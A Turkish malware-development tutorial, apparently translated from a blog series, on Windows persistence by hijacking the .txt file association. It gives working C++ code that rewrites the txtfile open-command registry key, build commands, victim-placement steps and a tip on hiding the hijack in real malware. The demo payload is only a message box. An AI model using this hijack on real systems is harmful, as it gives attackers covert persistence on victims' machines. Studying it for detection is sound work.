\newpage
\subsection{75. zararlı yazılım geliştirme: kalıcılık - bölüm 9. Varsayılan dosya uzantısı ele geçirme. Basit C++ örneği.}

﷽

![pers](./images/66/2022-08-29_02-25.png){width="80%"}    

Bu makale, ilginç zararlı yazılım kalıcılık tekniklerinden biri olan varsayılan dosya uzantısı ele geçirme üzerine kendi araştırmamın bir sonucudur.   

### varsayılan dosya ilişkilendirmesi (default file association)     

Örneğin, bir `.txt` dosyasına çift tıklandığında, açmak için `notepad.exe` kullanılır.    

![pers](./images/66/2022-08-29_02-17.png){width="80%"}    

Windows, `.txt` dosyalarına erişmek için `notepad.exe` kullanması gerektiğini bilir, çünkü `.txt` uzantısı (ve diğer birçok uzantı), bu tür dosyaları açabilen uygulamalara kayıt defterinde `HKEY_CLASSES_ROOT` altında eşlenmiştir.    

Varsayılan bir dosya ilişkilendirmesini ele geçirmek ve kötü amaçlı bir program çalıştırmak mümkündür.     

### pratik örnek    

Şimdi `.txt` uzantısını ele geçireceğiz. Bu durumda, `.txt` uzantısının işleyicisi aşağıdaki kayıt defteri anahtarında belirtilmiştir:    

`HKEY_CLASSES_ROOT\txtfile\shell\open\command`    

Komutu çalıştırın:    

```powershell
reg query "HKCR\txtfile\shell\open\command" /s
```

![pers](./images/66/2022-08-29_02-19.png){width="80%"}    

Ardından, "kötü amaçlı" uygulamamızı oluşturun:     

```cpp
/*
hack.cpp
evil app for windows persistence via
hijacking default file extension
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Gördüğünüz gibi, mantık her zamanki gibi oldukça basit: sadece `meow-meow` mesaj kutusunu açıyor.    

Bir sonraki adımda, aşağıdaki komut dosyasıyla `\HKEY_CLASSES_ROOT\txtfile\shell\open\command` değer verisini değiştirerek `.txt` dosya uzantısını ele geçirin:    

```cpp
/*
pers.cpp
windows persistence via
hijacking default file extension
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html
*/
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // command for replace
  // "%SystemRoot%\\system32\\NOTEPAD.EXE %1"
  // malicious app
  const char* cmd = "Z:\\2022-08-26-malware-pers-9\\hack.exe";

  // hijacking logic
  LONG res = RegOpenKeyEx(HKEY_CLASSES_ROOT, (LPCSTR)
  "\\txtfile\\shell\\open\\command", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // update key
    RegSetValueEx(hkey, (LPCSTR)"", 0, REG_SZ, (unsigned char*)cmd, 
    strlen(cmd));
    RegCloseKey(hkey);
  }
  return 0;
}
```

Gördüğünüz gibi, bu kaynak kodunda sadece `%SystemRoot%\system32\NOTEPAD.EXE %1` ifadesini `Z:\2022-08-26-malware-pers-9\hack.exe` ile değiştiriyoruz.    

### demo

Her şeyi çalışırken görelim. Kötü amaçlı yazılımımızı derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/66/2022-08-29_04-21.png){width="80%"}    

Oluşturulan `hack.exe` dosyası, kurbanın makinesine yerleştirilmelidir.      

Ardından, kalıcılıktan sorumlu programı derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/66/2022-08-29_04-22.png){width="80%"}    

Oluşturulan `pers.exe` dosyası da kurbanın makinesine yerleştirilmelidir.     

Ardından sadece çalıştırın:    

```powershell
.\pers.exe
```

![pers](./images/66/2022-08-29_02-21.png){width="80%"}    

Öyleyse, bir `.txt` dosyası açmayı deneyin, örneğin `test.txt` dosyasına çift tıklayın:     

![pers](./images/66/2022-08-29_02-22.png){width="80%"}    

![pers](./images/66/2022-08-29_02-24.png){width="80%"}    

Gördüğünüz gibi, “malware” çalıştırılacaktır. Mükemmel! :)   

Ardından, temizleme işlemi:     

```powershell
reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\system32\NOTEPAD.EXE %1"
```

![pers](./images/66/2022-08-29_02-34.png){width="80%"}    

Gerçek bir malware’de bunu biraz farklı bir mantıkla yapmak iyi bir uygulama olacaktır, böylece kurban kullanıcı hala orijinal `.txt` dosyasını açabilecek, ancak ek olarak kötü amaçlı etkinliği de çalıştıracaktır.     

Bu kalıcılık tekniği [SILENTTRINITY](https://attack.mitre.org/software/S0692/) framework’ü ve [Kimsuky](https://attack.mitre.org/groups/G0094/) siber casusluk grubu tarafından kullanılmaktadır. Bu malware, 2019 yılında Hırvatistan hükümet kurumlarına yönelik bir kampanyada kimliği belirsiz siber aktörler tarafından kullanılmıştır.    

Umarım bu yazı, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.    

[MITRE ATT&CK: Change Default File Association](https://attack.mitre.org/techniques/T1546/001/)     
[SILENTTRINITY](https://attack.mitre.org/software/S0692/)     
[Kimsuky](https://attack.mitre.org/groups/G0094/)      
[Github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-08-26-malware-pers-9)       
